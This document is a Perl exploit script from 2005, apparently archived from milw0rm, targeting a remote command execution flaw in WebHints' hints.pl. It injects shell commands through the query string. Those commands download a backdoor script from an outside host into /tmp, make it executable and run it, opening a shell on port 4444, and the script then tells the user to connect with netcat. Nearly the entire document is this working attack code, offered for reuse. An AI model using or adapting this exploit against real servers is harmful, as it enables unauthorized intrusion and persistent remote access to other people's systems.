# This exploit uses a backdoor that isn't located on this server.
# $cmde = "cd /tmp;wget http://www.khatotarh.com/NeT/alpha.txt";
# change for your own needs. /str0ke

#!/usr/bin/perl
######################################################################################
#        T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m           #
######################################################################################
#  EXPLOIT FOR: WebHints Remote C0mmand Execution Vuln                               #
#                                                                                    #
#Expl0it By: A l p h a _ P r o g r a m m e r (Sirus-v)                               #
#Email: Alpha_Programmer@Yahoo.Com                                                   #
#                                                                                    #
#This Xpl Run a backdo0r in Server With 4444 Port.                                   #
#Advisory: http://www.securityfocus.com/archive/1/401940/30/0/threaded               #
######################################################################################
# GR33tz T0 ==>     mh_p0rtal  --  oil_Karchack  --  The-CephaleX  -- Str0ke         #
#And Iranian Security & Technical Sites:                                             #
#                                                                                    #
#         TechnoTux.Com , IranTux.Com , Iranlinux.ORG , Barnamenevis.ORG             #
#      Crouz ,  Simorgh-ev   , IHSsecurity , AlphaST , Shabgard &  GrayHatz.NeT      #
######################################################################################

use IO::Socket;

if (@ARGV < 2)
{
 print "\n==============================================\n";
 print " \n    WebHints Exploit By Alpha_Programmer \n\n";
 print "      Trap-Set Underground Hacking Team      \n\n";
 print "            Usage: <T4rg3t> <Dir>      \n\n";
 print "==============================================\n\n";
 print "Examples:\n\n";
 print "    Webhints.pl www.Host.com /cgi-bin/ \n";
 exit();
}


$serv = $ARGV[0];
$serv =~ s/http:\/\///ge;

$dir = $ARGV[1];

$cmde = "cd /tmp;wget http://www.khatotarh.com/NeT/alpha.txt";
$cmde2 = "cd /tmp;cp alpha.txt alpha.pl;chmod 777 alpha.pl;perl alpha.pl";

$req = "GET $dir";
$req .= "hints.pl?|$cmde| HTTP/1.0\n\n\n\n";

$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>80) or die " (-) - C4n't C0nn3ct To The S3rver\n";

print $sock $req;
print "\nPlease Wait ...\n\n";
sleep(3000);
close($sock);

$sock2 = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", PeerPort=>80) or die " (-) - C4n't C0nn3ct To The S3rver\n";


$req2 = "GET $dir";
$req2 .= "hints.pl?|$cmde2| HTTP/1.0\n\n\n\n";

print $sock2 $req2;

sleep(100);

print "\n\n$$$   OK -- Now Try: Nc -v www.Site.com 4444   $$$\n";
print "$$  if This Port was Close , This mean is That , You Haven't Permission to Write in /TMP  $$\n";
print "Enjoy ;)";
### EOF ###

# milw0rm.com [2005-06-11]